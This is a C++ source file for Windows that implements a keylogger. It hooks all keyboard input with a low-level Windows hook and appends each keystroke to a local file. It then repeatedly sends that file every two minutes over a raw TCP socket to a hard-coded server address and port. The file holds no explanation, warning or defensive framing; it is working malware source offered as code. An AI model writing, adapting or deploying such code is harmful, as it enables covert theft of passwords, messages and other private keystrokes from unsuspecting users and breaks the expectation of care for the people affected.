#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <filesystem>


using namespace std;

bool shift = false;

const string SERVER_IP = "10.228.162.138";
const int SERVER_PORT = 1235; 

void sendfile(SOCKET s, const char fname[]){
    HANDLE hFile = CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    TransmitFile(s, hFile, 0, 0, NULL, NULL, 0);
}

void sendstring(SOCKET s, string k){
    send(s, k.c_str(), k.length(), 0);
}

string filesize(const char n[]){
    filesystem::path p = n;
    uintmax_t m =  filesystem::file_size(p);
    return to_string(m);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode == HC_ACTION) {
        
        
        if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN){
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int h = p->vkCode;
            if (h == 160 || h == 161){
                shift = true;
                return(CallNextHookEx(NULL, nCode, wParam, lParam));
            }
            if (h >= 65 && h <= 90 && !shift) h += 32;
            char c = h;
            ofstream f;
            f.open("f.txt", ios::app);
            f << c;
            f.close();
            // // cout << shift << "\n";
            // cout << c << "\n";    
        }

        if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP){
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int h = p->vkCode;
            if (h == 160 || h == 161){
                shift = false;
            }
        }
    }
    return(CallNextHookEx(NULL, nCode, wParam, lParam));
}

void run(){
    // Install the low-level keyboard & mouse hooks
    HHOOK Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
    // Keep this app running until we're told to stop
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(Kybd);
}

void send(SOCKET sock){
    string size = filesize("f.txt");
    string send = "'keylog\\f.txt'"+size+"b";
    sendstring(sock, send.c_str());
    sendfile(sock, "f.txt");
}

void sender(){
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "could not initialize winsock" << endl;
    }

    // Create socket
    SOCKET socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == INVALID_SOCKET) {
        cout << "could not make socket" << endl;
        WSACleanup();
    }

    // Set up server address
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
        cout << "invalid IP." << endl;
        closesocket(socket_fd);
        WSACleanup();
    }

    // Connect to server
    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "could not connect to server" << endl;
        closesocket(socket_fd);
        WSACleanup();
    }

    while (true){
        try{
            send(socket_fd);
        } catch(exception e){}
        this_thread::sleep_until(chrono::system_clock::now()+chrono::minutes(2));
    }


    closesocket(socket_fd);
    WSACleanup();
}

int main()
{
    thread t = thread(run);
    thread s = thread(sender);
    
    t.join();
    s.join();
    return 0;

}
